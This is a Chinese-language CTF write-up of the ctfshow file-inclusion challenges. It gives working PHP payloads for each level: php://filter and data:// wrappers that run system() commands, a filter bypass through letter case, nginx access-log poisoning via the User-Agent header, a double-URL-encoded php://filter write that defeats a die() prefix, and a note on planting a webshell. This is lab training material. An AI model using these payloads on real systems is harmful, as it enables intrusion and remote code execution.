## ctfshow- 文件包含

[TOC]

### web78

无限制：

```python
#1
?file=php://filter/read=convert.base64-encode/resource=flag.php
#2
?file=data://text/plain,<?php system('ls');?> 
?file=data://text/plain,<?php system('tac flag.php');?>
#3
php://input#用不了好像
```


```
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3tkYmQzOTRjNC1kZDkxLTQ5MmQtOTJlMi00MTU0ZTZiZmJmZGJ9Ijs=
$flag="ctfshow{dbd394c4-dd91-492d-92e2-4154e6bfbfdb}";
```


### web79

```php
$file = str_replace("php", "???", $file);
```

将php替换了，但是这个默认不忽略大小写，

1. 这里使用data://

```python
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==
# <?php system('tac f*');?>
```

2. 使用input，`hackbar`不行，这里使用bp

```
?file=Php://input
```



### web80

```php
$file = str_replace("php", "???", $file);
$file = str_replace("data", "???", $file);
```

这会ban了两个，这可以可以使用上一题的`Php://`

```
?file=Php://input

<?php system("ls");?>
<?php system("tac fl0g.php"); ?>
```

看了一下资料还可以利用日志,先访问这个日志地址，然后使用bp抓包

```
?file=/var/log/nginx/access.log
```
修改UA内容为：
```php
<?php system("ls");?>
<?php system('cat fl0g.php');?>
```
重发送发现回显

![image-20240905131450579](https://gitee.com/bx33661/image/raw/master/path/image-20240905131450579.png)

### web81
这会过滤升级到了三个
```php
$file = str_replace("php", "???", $file);    
$file = str_replace("data", "???", $file);    
$file = str_replace(":", "???", $file);
```
还是采用日志漏洞
> 需要注意的是⚠️
> 在 UA 里改成要执行的 php 命令 一定要一次成功 如果有问题就会 一直报错 只能重开环境，我试了好几次

```python
?file=/var/log/nginx/access.log

#执行命令查询
<?php system('ls');?>   #需要发两次
#执行命令获取flag
<?php system('cat fl0g.php');?>
```
![[Pasted image 20240905145927.png]]
此外我还发现一个问题，若是把命令改为双引号就会报错，就得重开环境不知道怎么回事！！！

### web82
丸辣，时间不对

### web87
丸辣,这会很有难度😭
```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);    
}    
```
过滤了四个参数，并且使用了`file_put_contents`,并且我们写的话后面的`die()`也不会让我执行

**file内容**-----两次url编码结果如下：
```python
%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%33%32%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30
```

**Pos参数content**：
```python
PD9waHAgc3lzdGVtKCdscycpOw==
#再加上两个aa
aaPD9waHAgc3lzdGVtKCdscycpOw==
```
成功后不会出现任何东西
访问`123.php`

![image-20240905153631565](https://gitee.com/bx33661/image/raw/master/path/image-20240905153631565.png)

我么现在得到flag文件的名称了
重复上面的操作只是将执行命令换了
```Python
content=aaPD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7
```

![image-20240905154239736](https://gitee.com/bx33661/image/raw/master/path/image-20240905154239736.png)

> 扩展方法：还可以穿参数的时候穿入getshell，使用蚁剑连接，寻找flag

### web83
```php
 if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){  
        die("error");  
    }
```
这次过滤的真的不少哦，使用data协议
> tips:如果构造命令时，base64 编码出现 “ = ”，可以尝试在后面加空格，避免等号出现。

1. 构造”ls“命令
```python
<?php system('ls');?> 
#PD9waHAgc3lzdGVtKCdscycpOz8+IA==
#不行就添加空格
<?php system('ls ');?> 
#PD9waHAgc3lzdGVtKCdscyAnKTs/PiA=
#不行就添加空格
<?php system('ls  ');?> 
# PD9waHAgc3lzdGVtKCdscyAgJyk7Pz4g
```
构造：
```python
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAgJyk7Pz4g
```
![sdsd](https://gitee.com/bx33661/image/raw/master/path/Snipaste_2024-09-05_16-31-42.png)
2. 有了文件名称，我们开始构造获取命令,思路一样
```python
... 省略几个步骤
<?php system('tac fl0g.php ');?>    
#PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAgJyk7Pz4gICAg
```
构造命令
```python
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAgJyk7Pz4gICAg
```
![sdsd](https://gitee.com/bx33661/image/raw/master/path/Snipaste_2024-09-05_16-36-57.png)
### web116
